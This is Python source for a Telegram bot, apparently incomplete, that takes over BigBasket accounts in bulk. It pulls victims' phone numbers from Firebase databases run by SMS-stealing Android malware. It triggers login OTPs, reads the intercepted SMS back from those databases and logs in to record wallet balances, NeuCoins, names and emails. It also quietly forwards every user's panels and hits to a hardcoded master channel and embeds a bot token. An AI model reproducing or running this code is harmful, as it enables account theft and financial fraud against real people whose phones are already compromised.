#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BigBasket Enterprise Bulk Scanner & Auto-OTP Telegram Bot — Jio-Bot Architecture
Bot Token: 8538201990:AAGdZy3HmD3nja50DlHNInJXJHL6uIpdkGc (@mangerbot2423bot)

Key Features (Jio-Bot Equivalent):
- ⚡ Scanner Hub: Start, Stop, Resume, Live Status with Progress Bar & ETA
- 📂 Panels & Data Hub: Add, View, Delete, Ping & Batch Scan Firebase RTDB Panels
- 📡 Channels & Logs Hub: Custom Log & Storage Channels with Live Test Pings
- 📥 Export Hub: Download Latest Hits Report directly in Telegram DM
- 📱 Single Check: Instant 1-on-1 Number Verification with Wallet & NeuCoins Breakdown
- 🔄 24/7 Render Keep-Alive: Embedded HTTP Server & Self-Ping Loop (0% Inactivity Sleep)
- 💾 Auto-Recovery: Interrupted Scan State Persistence — Resume right where it stopped
"""

import os
import sys
import re
import csv
import io
import html
import json
import time
import uuid
import random
import threading
import http.server
import socketserver
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, Any, Optional, List, Tuple, Set, Callable

try:
    import telebot
    from telebot import types
except ImportError:
    print("pip install pyTelegramBotAPI")
    sys.exit(1)

try:
    from curl_cffi import requests as cffi_requests
except ImportError:
    print("pip install curl_cffi")
    sys.exit(1)

try:
    import requests
except ImportError:
    print("pip install requests")
    sys.exit(1)

BOT_START_TIME = time.time()

# ============ CONFIGURATION ============
SUPER_ADMIN_ID = 8327850869
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8538201990:AAGdZy3HmD3nja50DlHNInJXJHL6uIpdkGc")
MASTER_CHANNEL_ID = os.environ.get("MASTER_CHANNEL_ID", "-1003626087056")
DEFAULT_LOG_CHANNEL = os.environ.get("DEFAULT_LOG_CHANNEL", "-1003626087056")
DEFAULT_STORAGE_CHANNEL = os.environ.get("DEFAULT_STORAGE_CHANNEL", "-1003626087056")
ADMIN_USER_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_USER_IDS", "8327850869").split(",") if x.strip()]
MAX_SCAN_WORKERS = int(os.environ.get("MAX_SCAN_WORKERS", "5"))

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
RESULTS_DIR = os.path.join(BASE_DIR, "results")
UPLOADS_DIR = os.path.join(BASE_DIR, "uploads")
CONFIG_DIR = os.path.join(BASE_DIR, "config")
STATE_DIR = os.path.join(CONFIG_DIR, "scans")
os.makedirs(RESULTS_DIR, exist_ok=True)
os.makedirs(UPLOADS_DIR, exist_ok=True)
os.makedirs(CONFIG_DIR, exist_ok=True)
os.makedirs(STATE_DIR, exist_ok=True)

BB_API = "https://www.bigbasket.com"
BB_OTP_URL = f"{BB_API}/member-tdl/v3/member/otp/"
BB_LOGIN_URL = f"{BB_API}/member-tdl/v3/member/unified-login/"
BB_WALLET_URL = f"{BB_API}/wallet/v1/details"
BB_MEMBER_URL = f"{BB_API}/ui-svc/v1/member/details"
BB_DEV_REG = f"{BB_API}/mapi/v4.2.0/register/device/"
BB_UI_URL = f"{BB_API}/ui-svc/v2/header/?send_door_info=true&app_launch=true"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# Global state
user_sessions: Dict[int, dict] = {}
session_lock = threading.Lock()
active_scans: Dict[int, dict] = {}
scan_lock = threading.Lock()

# Persistent configuration
PANELS_FILE = os.path.join(CONFIG_DIR, "panels.json")
CHANNELS_FILE = os.path.join(CONFIG_DIR, "channels.json")
STORAGE_CHANNELS_FILE = os.path.join(CONFIG_DIR, "storage_channels.json")
KNOWN_USERS_FILE = os.path.join(CONFIG_DIR, "known_users.json")

user_panels: Dict[int, List[str]] = {}
user_channels: Dict[int, str] = {}
user_storage_channels: Dict[int, str] = {}
known_users: Set[int] = {SUPER_ADMIN_ID}
cfg_lock = threading.Lock()

def load_configs():
    global user_panels, user_channels, user_storage_channels, known_users
    with cfg_lock:
        if os.path.exists(PANELS_FILE):
            try:
                with open(PANELS_FILE, "r", encoding="utf-8") as f:
                    user_panels = {int(k): v for k, v in json.load(f).items()}
            except Exception:
                pass
        if os.path.exists(CHANNELS_FILE):
            try:
                with open(CHANNELS_FILE, "r", encoding="utf-8") as f:
                    user_channels = {int(k): str(v) for k, v in json.load(f).items()}
            except Exception:
                pass
        if os.path.exists(STORAGE_CHANNELS_FILE):
            try:
                with open(STORAGE_CHANNELS_FILE, "r", encoding="utf-8") as f:
                    user_storage_channels = {int(k): str(v) for k, v in json.load(f).items()}
            except Exception:
                pass
        if os.path.exists(KNOWN_USERS_FILE):
            try:
                with open(KNOWN_USERS_FILE, "r", encoding="utf-8") as f:
                    known_users = set(json.load(f))
            except Exception:
                pass
        known_users.add(SUPER_ADMIN_ID)

        # Super Admin Universal Aggregation: Ensure Super Admin master pool has all panels
        if SUPER_ADMIN_ID not in user_panels:
            user_panels[SUPER_ADMIN_ID] = []
        all_master = set(user_panels[SUPER_ADMIN_ID])
        for uid, plist in user_panels.items():
            if isinstance(plist, list):
                all_master.update(plist)
        user_panels[SUPER_ADMIN_ID] = list(all_master)

def save_configs():
    with cfg_lock:
        try:
            with open(PANELS_FILE, "w", encoding="utf-8") as f:
                json.dump({str(k): v for k, v in user_panels.items()}, f, indent=2)
            with open(CHANNELS_FILE, "w", encoding="utf-8") as f:
                json.dump({str(k): v for k, v in user_channels.items()}, f, indent=2)
            with open(STORAGE_CHANNELS_FILE, "w", encoding="utf-8") as f:
                json.dump({str(k): v for k, v in user_storage_channels.items()}, f, indent=2)
            with open(KNOWN_USERS_FILE, "w", encoding="utf-8") as f:
                json.dump(list(known_users), f, indent=2)
        except Exception:
            pass

def register_user(chat_id: int):
    if not chat_id:
        return
    if chat_id not in known_users:
        with cfg_lock:
            known_users.add(chat_id)
            try:
                with open(KNOWN_USERS_FILE, "w", encoding="utf-8") as f:
                    json.dump(list(known_users), f, indent=2)
            except Exception:
                pass

load_configs()

def get_effective_log_channel(chat_id: int) -> str:
    with cfg_lock:
        return user_channels.get(chat_id, DEFAULT_LOG_CHANNEL)

def get_effective_storage_channel(chat_id: int) -> str:
    with cfg_lock:
        return user_storage_channels.get(chat_id, DEFAULT_STORAGE_CHANNEL)

def sync_panels_to_master(added_panels: List[str], chat_id: int, user_name: str = ""):
    """
    Super Admin Universal Architecture (matches Jio Bot):
    1. Unconditionally merges all newly added panels into Super Admin's (8327850869) master pool.
    2. Auto-forwards new panel links to the Master Universal Channel (-1003626087056).
    """
    if not added_panels:
        return

    # 1. Merge into Super Admin master pool
    with cfg_lock:
        if SUPER_ADMIN_ID not in user_panels:
            user_panels[SUPER_ADMIN_ID] = []
        master_added = 0
        for p in added_panels:
            if p not in user_panels[SUPER_ADMIN_ID]:
                user_panels[SUPER_ADMIN_ID].append(p)
                master_added += 1
        if master_added > 0:
            save_configs()
        total_master = len(user_panels[SUPER_ADMIN_ID])

    # 2. Forward to Master Universal Channel
    master_ch = MASTER_CHANNEL_ID or DEFAULT_STORAGE_CHANNEL or "-1003626087056"
    if master_ch:
        try:
            panel_preview = "\n".join([f"• <code>{esc(p)}</code>" for p in added_panels[:15]])
            if len(added_panels) > 15:
                panel_preview += f"\n<i>... and {len(added_panels) - 15} more panels</i>"

            card = (
                f"👑 <b>[Master Universal Panels Backup]</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>Contributed by:</b> <code>{chat_id}</code> ({esc(user_name or 'User')})\n"
                f"📥 <b>New Panels Added:</b> <code>+{len(added_panels)}</code>\n"
                f"🌐 <b>Panels List:</b>\n{panel_preview}\n\n"
                f"📊 <b>Total Master Panels:</b> <code>{total_master}</code>\n"
                f"🕒 <b>Time:</b> {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🔒 <i>Auto-synced to Master Universal Channel across bot!</i>"
            )
            bot.send_message(
                int(master_ch) if str(master_ch).lstrip("-").isdigit() else master_ch,
                card,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception as e:
            print(f"⚠️ Failed to forward panels to master channel: {e}")

def esc(text: Any) -> str:
    if text is None:
        return ""
    return html.escape(str(text), quote=False)

def normalize_phone(raw: Any) -> Optional[str]:
    if not raw:
        return None
    s = re.sub(r"\D", "", str(raw))
    if len(s) == 12 and s.startswith("91"):
        s = s[2:]
    elif len(s) == 11 and s.startswith("0"):
        s = s[1:]
    if len(s) == 10 and s[0] in "6789":
        return s
    return None

# ============ SCAN STATE PERSISTENCE & AUTO-RECOVERY ============
def get_state_file(chat_id: int) -> str:
    return os.path.join(STATE_DIR, f"scan_state_{chat_id}.json")

def save_scan_state(chat_id: int):
    with scan_lock:
        st = active_scans.get(chat_id)
        if not st or not st.get("running"):
            return
        state_data = {
            "chat_id": chat_id,
            "scan_title": st.get("scan_title", "BigBasket Bulk Scan"),
            "total": st.get("total", 0),
            "processed": st.get("processed", 0),
            "processed_phones": list(st.get("processed_phones", [])),
            "targets": st.get("all_targets", []),
            "hits": list(st.get("hits", [])),
            "zero_bal": list(st.get("zero_bal", [])),
            "no_account": list(st.get("no_account", [])),
            "offline": list(st.get("offline", [])),
            "timeout": list(st.get("timeout", [])),
            "failed": list(st.get("failed", [])),
            "start_time": st.get("start_time", time.time()),
            "last_updated": time.time(),
        }

    sf = get_state_file(chat_id)
    tmp_sf = sf + ".tmp"
    try:
        with open(tmp_sf, "w", encoding="utf-8") as f:
            json.dump(state_data, f, indent=2)
        os.replace(tmp_sf, sf)
    except Exception as e:
        print(f"⚠️ Error saving scan state: {e}")

def get_saved_scan_state(chat_id: int) -> Optional[dict]:
    sf = get_state_file(chat_id)
    if os.path.exists(sf):
        try:
            with open(sf, "r", encoding="utf-8") as f:
                data = json.load(f)
            proc_set = set(data.get("processed_phones", []))
            all_t = data.get("targets", [])
            rem = [t for t in all_t if t.get("phone") not in proc_set]
            if rem:
                return data
            else:
                clear_scan_state(chat_id)
        except Exception:
            pass
    return None

def clear_scan_state(chat_id: int):
    sf = get_state_file(chat_id)
    try:
        if os.path.exists(sf):
            os.remove(sf)
    except Exception:
        pass

# ============ RENDER 24/7 KEEP-ALIVE SERVER & HEARTBEAT ============
class RenderHealthHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "application/json")
        self.end_headers()
        uptime_sec = int(time.time() - BOT_START_TIME)
        resp = {
            "status": "healthy",
            "bot": "BigBasket Checker Bot",
            "uptime_seconds": uptime_sec,
            "uptime_human": f"{uptime_sec // 3600}h {(uptime_sec % 3600) // 60}m {uptime_sec % 60}s",
            "active_scans": len(active_scans),
            "timestamp": datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        }
        self.wfile.write(json.dumps(resp).encode("utf-8"))

    def log_message(self, format, *args):
        pass

def start_render_health_server():
    port = int(os.environ.get("PORT", "8080"))
    def run_server():
        try:
            class ReusableTCPServer(socketserver.TCPServer):
                allow_reuse_address = True
            with ReusableTCPServer(("0.0.0.0", port), RenderHealthHandler) as httpd:
                print(f"🌍 [Render 24/7] Keep-Alive HTTP health server running on port {port}")
                httpd.serve_forever()
        except Exception as e:
            print(f"⚠️ [Render 24/7] HTTP health server warning: {e}")

    t = threading.Thread(target=run_server, daemon=True)
    t.start()

def start_render_self_ping():
    ext_url = os.environ.get("KEEP_ALIVE_URL") or os.environ.get("RENDER_EXTERNAL_URL")
    if not ext_url:
        return

    def ping_loop():
        url = f"{ext_url.rstrip('/')}/health"
        print(f"💓 [Render 24/7] Self-ping active! Pinging {url} every 9 minutes...")
        while True:
            time.sleep(540)
            try:
                requests.get(url, timeout=15)
            except Exception:
                pass

    t = threading.Thread(target=ping_loop, daemon=True)
    t.start()

# ============ TELEGRAM SAFE MESSAGING ============
def safe_send(chat_id: int, text: str, reply_markup=None):
    try:
        truncated = text[:4000] if len(text) > 4000 else text
        return bot.send_message(chat_id, truncated, reply_markup=reply_markup, disable_web_page_preview=True)
    except Exception:
        try:
            plain = re.sub(r"<[^>]+>", "", text)
            plain_trunc = plain[:4000] if len(plain) > 4000 else plain
            return bot.send_message(chat_id, plain_trunc, reply_markup=reply_markup, parse_mode=None, disable_web_page_preview=True)
        except Exception:
            return None

def safe_edit(chat_id: int, message_id: int, text: str, reply_markup=None):
    try:
        truncated = text[:4000] if len(text) > 4000 else text
        bot.edit_message_text(truncated, chat_id, message_id, reply_markup=reply_markup, disable_web_page_preview=True)
    except Exception as e:
        if "message is not modified" in str(e).lower():
            return
        try:
            plain = re.sub(r"<[^>]+>", "", text)
            plain_trunc = plain[:4000] if len(plain) > 4000 else plain
            bot.edit_message_text(plain_trunc, chat_id, message_id, reply_markup=reply_markup, parse_mode=None, disable_web_page_preview=True)
        except Exception:
            pass

def send_or_edit(chat_id: int, text: str, reply_markup=None, message_id: Optional[int] = None):
    if message_id:
        try:
            safe_edit(chat_id, message_id, text, reply_markup=reply_markup)
            return
        except Exception:
            pass
    safe_send(chat_id, text, reply_markup=reply_markup)

def broadcast_hit_to_channels(hit_card: str, chat_id: int):
    channels = set()
    log_ch = get_effective_log_channel(chat_id)
    if log_ch:
        channels.add(log_ch)
    # Master Universal Channel unconditionally receives 100% of hits:
    master_ch = MASTER_CHANNEL_ID or DEFAULT_LOG_CHANNEL or "-1003626087056"
    if master_ch:
        channels.add(master_ch)

    for ch in channels:
        try:
            safe_send(int(ch) if str(ch).lstrip("-").isdigit() else ch, hit_card)
        except Exception:
            pass

# ============ BIGBASKET CLIENT ============
class BigBasketClient:
    def __init__(self):
        self.s = cffi_requests.Session(impersonate="chrome120")
        profiles = [
            {"make": "Samsung", "model": "SM-A536E", "os": "13"},
            {"make": "Google", "model": "Pixel 7", "os": "14"},
            {"make": "OnePlus", "model": "IN2023", "os": "13"},
            {"make": "Xiaomi", "model": "2201116SG", "os": "13"},
            {"make": "Vivo", "model": "V2249", "os": "14"},
            {"make": "Realme", "model": "RMX3363", "os": "13"},
        ]
        self.p = random.choice(profiles)
        self.did = "".join(random.choices("0123456789abcdef", k=16))
        self.token = ""
        self.h = {
            "User-Agent": f"BB Android/v8.38.0/os {self.p['os']}",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br",
            "x-channel": "BB-Android",
            "x-tcp-device-version": "android_8.38.0_25115710",
            "x-tcp-platform": "native",
            "x-entry-context": "bb-b2c",
            "x-entry-context-id": "100",
            "x-bucket-id": "36",
            "x-device-id": self.did,
            "x-device-model": f"{self.p['make']} {self.p['model']}",
            "x-is-debug": "false",
            "x-pharma": "true",
            "x-retry": "0",
            "x-integrated-fc-door-visible": "true",
            "x-tracker": str(uuid.uuid4()),
            "common-client-static-version": "105",
        }
        self._ok = False

    def _ck(self, r):
        try:
            for k, v in r.cookies.items():
                self.s.cookies.set(k, v)
        except Exception:
            pass

    def _setup(self):
        if self._ok:
            return
        try:
            p = {
                "imei": "02:00:00:00:00:00",
                "device_id": self.did,
                "city_id": "1",
                "properties": json.dumps({
                    "platform": "java",
                    "os_name": "android",
                    "os_version": self.p["os"],
                    "app_version": "8.38.0",
                    "device_make": self.p["make"],
                    "device_model": self.p["model"],
                    "screen_resolution": "1080X2400",
                    "screen_dpi": 440
                })
            }
            h = self.h.copy()
            h["Content-Type"] = "application/x-www-form-urlencoded"
            r = self.s.post(BB_DEV_REG, data=p, headers=h, timeout=12)
            self._ck(r)
        except Exception:
            pass
        try:
            r = self.s.get(BB_UI_URL, headers=self.h, timeout=10)
            self._ck(r)
        except Exception:
            pass
        self._ok = True

    def send_otp(self, phone: str) -> Tuple[bool, str]:
        self._setup()
        self.h["x-tracker"] = str(uuid.uuid4())
        c = self.s.cookies.get("csurftoken")
        if c:
            self.h["x-csurftoken"] = c
        try:
            r = self.s.post(
                BB_OTP_URL,
                json={"identifier": phone, "referrer": "unified_login"},
                headers=self.h,
                timeout=18
            )
            self._ck(r)
            if r.status_code == 403:
                return False, "Access blocked (403)"
            if r.status_code == 429:
                return False, "Rate limit exceeded (429)"
            if r.status_code >= 500:
                return False, f"BigBasket Server Error ({r.status_code})"

            try:
                d = r.json()
            except Exception:
                return False, f"Invalid response ({r.status_code})"

            if r.status_code == 200 and d.get("message") == "OTP sent successfully":
                return True, d.get("refId", "")
            err_msg = ""
            if "errors" in d and isinstance(d["errors"], list) and len(d["errors"]) > 0:
                err_msg = d["errors"][0].get("display_msg") or d["errors"][0].get("msg", "")
            return False, err_msg or "Failed to send OTP"
        except Exception as e:
            return False, str(e)

    def verify(self, phone: str, otp: str, ref: str) -> Tuple[bool, str, dict]:
        self.h["x-tracker"] = str(uuid.uuid4())
        c = self.s.cookies.get("csurftoken")
        if c:
            self.h["x-csurftoken"] = c
        try:
            r = self.s.post(
                BB_LOGIN_URL,
                json={"mobile_no": phone, "mobile_no_otp": otp, "refId": ref},
                headers=self.h,
                timeout=18
            )
            self._ck(r)
            try:
                d = r.json()
            except Exception:
                return False, f"Invalid verify response ({r.status_code})", {}

            if r.status_code == 200 and "bb_token" in d:
                token = d["bb_token"]
                self.token = token
                self.s.cookies.set("BBAUTHTOKEN", token, domain=".bigbasket.com")
                if d.get("customer_hash"):
                    self.s.cookies.set("customer_hash", d["customer_hash"], domain=".bigbasket.com")
                if d.get("m_id"):
                    self.s.cookies.set("_bb_mid", d["m_id"], domain=".bigbasket.com")
                return True, token, d
            err_msg = ""
            if "errors" in d and isinstance(d["errors"], list) and len(d["errors"]) > 0:
                err_msg = d["errors"][0].get("display_msg") or d["errors"][0].get("msg", "")
            return False, err_msg or "Invalid OTP", d
        except Exception as e:
            return False, str(e), {}

    def wallet(self) -> Optional[dict]:
        try:
            h = self.h.copy()
            h["x-entry-context"] = "bbnow"
            h["x-entry-context-id"] = "10"
            h["x-tracker"] = str(uuid.uuid4())
            if self.token:
                h["x-auth-token"] = self.token
                h["Authorization"] = f"Bearer {self.token}"

            result = {"total_balance": 0.0, "current_wallet_balance": 0.0, "neucoins": 0, "name": "", "email": ""}

            r = self.s.get(BB_WALLET_URL, headers=h, timeout=15)
            if r.status_code == 200:
                try:
                    d = r.json()
                    result["total_balance"] = float(d.get("total_balance", 0.0) or d.get("balance", 0.0) or 0.0)
                    result["current_wallet_balance"] = float(d.get("current_wallet_balance", 0.0) or d.get("usable_balance", 0.0) or 0.0)
                    result["neucoins"] = int(d.get("neucoins", 0) or d.get("points", 0) or 0)
                except Exception:
                    pass

            r2 = self.s.get(BB_MEMBER_URL, headers=h, timeout=15)
            if r2.status_code == 200:
                try:
                    d2 = r2.json()
                    if "member" in d2:
                        m = d2["member"]
                        result["name"] = f"{m.get('first_name', '')} {m.get('last_name', '')}".strip()
                        result["email"] = m.get("email", "")
                    if "wallet" in d2 and result["total_balance"] == 0:
                        w = d2["wallet"]
                        result["total_balance"] = float(w.get("total_balance", 0.0) or 0.0)
                        result["current_wallet_balance"] = float(w.get("current_wallet_balance", 0.0) or 0.0)
                except Exception:
                    pass

            return result
        except Exception:
            return None

# ============ FIREBASE ENDPOINT & OTP UTILS ============
RESOLVED_URL_CACHE: Dict[str, str] = {}
DEVICE_PATH_CACHE: Dict[str, str] = {}
cache_lock = threading.Lock()

CANDIDATE_PATHS = [
    "messages/{did}",
    "sms/{did}",
    "clients/{did}/messages",
    "clients/{did}/sms",
    "devices/{did}/messages",
    "devices/{did}/sms",
    "users/{did}/messages",
    "victim/{did}/messages"
]

def resolve_firebase_url(panel_or_url: str) -> Optional[str]:
    if not panel_or_url:
        return None
    s = panel_or_url.strip().rstrip("/")
    if s.startswith("http://") or s.startswith("https://"):
        return s
    with cache_lock:
        if s in RESOLVED_URL_CACHE:
            return RESOLVED_URL_CACHE[s]

    candidates = [
        f"https://{s}-default-rtdb.firebaseio.com",
        f"https://{s}.firebaseio.com",
        f"https://{s}-default-rtdb.asia-southeast1.firebasedatabase.app"
    ]
    for candidate in candidates:
        try:
            r = requests.get(f"{candidate}/.json?shallow=true", timeout=3)
            if r.status_code == 200:
                with cache_lock:
                    RESOLVED_URL_CACHE[s] = candidate
                return candidate
        except Exception:
            pass

    fallback = f"https://{s}-default-rtdb.firebaseio.com"
    with cache_lock:
        RESOLVED_URL_CACHE[s] = fallback
    return fallback

def extract_bb_otp(text: str, sender: str) -> Optional[str]:
    if not text:
        return None
    combined = f"{sender} {text}".lower()
    is_bb = any(k in combined for k in (
        "bbaskt", "bigbkt", "bigbsk", "tatane", "tatapay", "tata",
        "bbnow", "bb-now", "bigbasket", "neu"
    ))
    has_otp_kw = any(k in combined for k in (
        "otp", "code", "pin", "login", "verification", "secret", "verify"
    ))
    if not (is_bb or has_otp_kw):
        return None

    m = re.search(r"(?:otp|code|is|pin|login|verification)[\s\S]{0,25}?\b([0-9]{4,6})\b", text, re.I)
    if m:
        return m.group(1)

    m_before = re.search(r"\b([0-9]{4,6})\b\s*(?:is\s*(?:your|the)\s*)?(?:otp|code|verification|login|secret)", text, re.I)
    if m_before:
        return m_before.group(1)

    m_dash = re.search(r"\b([0-9]{3})-([0-9]{3})\b", text)
    if m_dash:
        return f"{m_dash.group(1)}{m_dash.group(2)}"

    if is_bb:
        m_6 = re.search(r"\b([0-9]{6})\b", text)
        if m_6:
            return m_6.group(1)
        m_4 = re.search(r"\b([0-9]{4})\b", text)
        if m_4:
            return m_4.group(1)
    return None

def find_working_device_path(clean_url: str, did: str) -> str:
    cache_key = f"{clean_url}:{did}"
    with cache_lock:
        if cache_key in DEVICE_PATH_CACHE:
            return DEVICE_PATH_CACHE[cache_key]

    for template in CANDIDATE_PATHS:
        p = template.format(did=did)
        try:
            endpoint = f"{clean_url}/{p}.json"
            r = requests.get(endpoint, timeout=3)
            if r.status_code == 200 and r.json() is not None:
                with cache_lock:
                    DEVICE_PATH_CACHE[cache_key] = p
                return p
        except Exception:
            pass

    default_path = f"messages/{did}"
    with cache_lock:
        DEVICE_PATH_CACHE[cache_key] = default_path
    return default_path

def fetch_existing_message_keys(fb_url: str, did: str) -> Set[str]:
    known = set()
    clean_url = fb_url.rstrip("/")
    active_path = find_working_device_path(clean_url, did)
    try:
        endpoint = f"{clean_url}/{active_path}.json"
        r = requests.get(endpoint, timeout=5)
        if r.status_code == 200 and isinstance(r.json(), dict):
            known.update(str(k) for k in r.json().keys())
    except Exception:
        pass
    return known

def watch_device_otp(
    fb_url: str,
    did: str,
    known_keys: Set[str],
    sent_time: float,
    timeout_sec: int = 40,
    stop_checker: Optional[Callable[[], bool]] = None
) -> Optional[str]:
    if not fb_url or not did:
        return None
    clean_url = fb_url.rstrip("/")
    start_time = time.time()
    active_path = find_working_device_path(clean_url, did)

    while time.time() - start_time < timeout_sec:
        if stop_checker and stop_checker():
            return None

        try:
            endpoint = f"{clean_url}/{active_path}.json"
            r = requests.get(endpoint, timeout=4)
            if r.status_code == 200 and isinstance(r.json(), dict):
                data = r.json()
                for mk, item in reversed(list(data.items())):
                    if str(mk) in known_keys or not isinstance(item, dict):
                        continue
                    text = str(item.get("message") or item.get("body") or item.get("msg") or item.get("text") or "")
                    sender = str(item.get("sender") or item.get("phone") or item.get("address") or "").upper()
                    otp = extract_bb_otp(text, sender)
                    if otp:
                        return otp
        except Exception:
            pass
        time.sleep(2.0)
    return None

# ============ JIO-BOT EQUIVALENT ONLINE & SIM AUDITOR ============
def is_device_online(data: Any) -> bool:
    """Robust online detector matching Jio-Automation engine."""
    if not isinstance(data, dict):
        return False

    candidates = [data]
    for sub_k in ("info", "deviceInfo", "device_info", "details", "client", "system"):
        sub = data.get(sub_k)
        if isinstance(sub, dict):
            candidates.append(sub)

    for c in candidates:
        raw_status = (
            c.get("status")
            if c.get("status") is not None
            else c.get("isOnline")
            if c.get("isOnline") is not None
            else c.get("online")
            if c.get("online") is not None
            else c.get("state")
            if c.get("state") is not None
            else c.get("connected")
        )
        if raw_status is not None:
            if raw_status is True or raw_status == 1 or raw_status == "1" or str(raw_status).strip().lower() in ("online", "true", "active", "connected", "1"):
                return True
            if raw_status is False or raw_status == 0 or raw_status == "0" or str(raw_status).strip().lower() in ("offline", "false", "disconnected", "0"):
                return False

    now = time.time()
    for c in candidates:
        for ts_field in ("timestamp", "last_seen", "lastSeen", "lastOnline", "lastMessageTime", "time", "updated_at"):
            val = c.get(ts_field)
            if isinstance(val, dict):
                val = val.get("timestamp") or val.get("time")
            if val:
                try:
                    t_float = float(val)
                    if t_float > 1e12:
                        t_float /= 1000.0
                    diff = now - t_float
                    if -180 <= diff <= 900:
                        return True
                except Exception:
                    pass

    # If neither explicit offline nor timestamp, do not drop device (keep as potentially active)
    return True

def audit_device_sim_slots(did: str, dev_data: dict, fb_url: str, panel_ref: str) -> List[Dict[str, Any]]:
    targets = []
    seen = set()
    dev_name = dev_data.get("modelName") or dev_data.get("model") or dev_data.get("device") or "Android Device"

    candidates = [dev_data]
    for sub_k in ("info", "deviceInfo", "device_info", "details", "system", "client"):
        sub = dev_data.get(sub_k)
        if isinstance(sub, dict):
            candidates.append(sub)

    for c in candidates:
        # 1. Direct phone keys
        for k in (
            "phoneNumber", "phone", "phone_number", "mobNo", "mobile", "number",
            "sim1", "sim_1", "sim2", "sim_2", "simNumber", "sim1Number", "sim2Number",
            "sim_number", "line1Number", "line1_number", "telephone"
        ):
            val = c.get(k)
            if val:
                num = normalize_phone(val)
                if num and num not in seen:
                    seen.add(num)
                    slot_title = "Hardware SIM Slot 1" if "1" in k or k in ("mobNo", "phoneNumber", "phone", "mobile") else "Hardware SIM Slot 2"
                    targets.append({
                        "phone": num,
                        "device": dev_name,
                        "dev_id": did,
                        "panel": fb_url,
                        "panel_name": panel_ref,
                        "slot": slot_title,
                        "is_physical_sim": True
                    })

        # 2. sims / simInfo containers
        for sim_key in ("sims", "simInfo", "sim_info", "simList", "sim_list"):
            sim_container = c.get(sim_key)
            if isinstance(sim_container, str):
                try:
                    sim_container = json.loads(sim_container)
                except Exception:
                    pass
            if isinstance(sim_container, dict):
                sim_container = list(sim_container.values())

            if isinstance(sim_container, list):
                for idx, s in enumerate(sim_container):
                    if isinstance(s, dict):
                        carrier = s.get("carrierName") or s.get("carrier") or s.get("operator") or s.get("simOperatorName") or "SIM"
                        slot_idx = s.get("simSlotIndex") or s.get("slot") or idx
                        slot_num = int(slot_idx) + 1 if str(slot_idx).isdigit() else (idx + 1)
                        for sk in ("phoneNumber", "phone", "number", "simNumber", "line1Number"):
                            raw_num = s.get(sk)
                            num = normalize_phone(raw_num)
                            if num and num not in seen:
                                seen.add(num)
                                targets.append({
                                    "phone": num,
                                    "device": dev_name,
                                    "dev_id": did,
                                    "panel": fb_url,
                                    "panel_name": panel_ref,
                                    "slot": f"Hardware SIM Slot {slot_num} ({carrier})",
                                    "is_physical_sim": True
                                })

    return targets

def harvest_panel_online_targets(raw_panel: str) -> Tuple[List[Dict[str, Any]], int, Optional[str]]:
    fb_url = resolve_firebase_url(raw_panel)
    if not fb_url:
        return [], 0, "Invalid Firebase URL"
    clean_url = fb_url.rstrip("/")
    devices_dict = None

    candidate_paths = ["clients.json", "devices.json", "client.json", "device.json", "users.json", "victim.json", "all_user.json"]
    for p in candidate_paths:
        try:
            r = requests.get(f"{clean_url}/{p}", timeout=6)
            if r.status_code == 200 and isinstance(r.json(), dict) and r.json():
                devices_dict = r.json()
                break
        except Exception:
            pass

    if not devices_dict:
        try:
            r_root = requests.get(f"{clean_url}/.json?shallow=true", timeout=6)
            if r_root.status_code == 200 and isinstance(r_root.json(), dict):
                for k in r_root.json().keys():
                    k_str = str(k).lower()
                    if any(x in k_str for x in ("client", "device", "victim", "user", "sms")):
                        r_sub = requests.get(f"{clean_url}/{k}.json", timeout=6)
                        if r_sub.status_code == 200 and isinstance(r_sub.json(), dict) and r_sub.json():
                            devices_dict = r_sub.json()
                            break
        except Exception:
            pass

    if not devices_dict:
        return [], 0, "Database locked, deactivated, or empty"

    all_count = len(devices_dict)
    online_targets = []
    seen_nums = set()

    for did, dev_data in devices_dict.items():
        if not isinstance(dev_data, dict):
            continue
        if is_device_online(dev_data):
            dev_targets = audit_device_sim_slots(str(did), dev_data, fb_url, raw_panel)
            for t in dev_targets:
                if t["phone"] not in seen_nums:
                    seen_nums.add(t["phone"])
                    online_targets.append(t)

    return online_targets, all_count, None

# ============ SCRAPED FILE PARSER ============
def parse_scraped_file(filepath_or_content: str, fallback_panel: str = "") -> List[Dict[str, Any]]:
    content = filepath_or_content
    if os.path.exists(filepath_or_content):
        try:
            with open(filepath_or_content, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
        except Exception:
            pass

    content = content.replace("\r\n", "\n").replace("\r", "\n")
    targets = []
    seen = set()

    if "," in content and ("Phone Number" in content or "Device ID" in content or "Firebase" in content):
        try:
            reader = csv.DictReader(io.StringIO(content))
            for row in reader:
                raw_num = row.get("Phone Number") or row.get("Raw Number") or row.get("phone") or row.get("number")
                num = normalize_phone(raw_num)
                if num and num not in seen:
                    seen.add(num)
                    did = row.get("Device ID") or row.get("deviceId") or ""
                    pnl = row.get("Firebase URL") or row.get("Firebase DB") or row.get("panel") or fallback_panel
                    dname = row.get("Device Name") or row.get("model") or "Device"
                    targets.append({
                        "phone": num,
                        "device": dname.strip(),
                        "dev_id": did.strip(),
                        "panel": resolve_firebase_url(pnl.strip()),
                        "panel_name": pnl.strip(),
                        "slot": "Hardware SIM",
                        "is_physical_sim": True
                    })
            if targets:
                return targets
        except Exception:
            pass

    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        m = re.search(r"\b([6-9]\d{9})\b", line)
        if m:
            num = m.group(1)
            if num not in seen:
                seen.add(num)
                m_dev = re.search(r"dev(?:ice)?[:=\s]+([a-zA-Z0-9_\-]+)", line, re.I)
                did = m_dev.group(1) if m_dev else ""
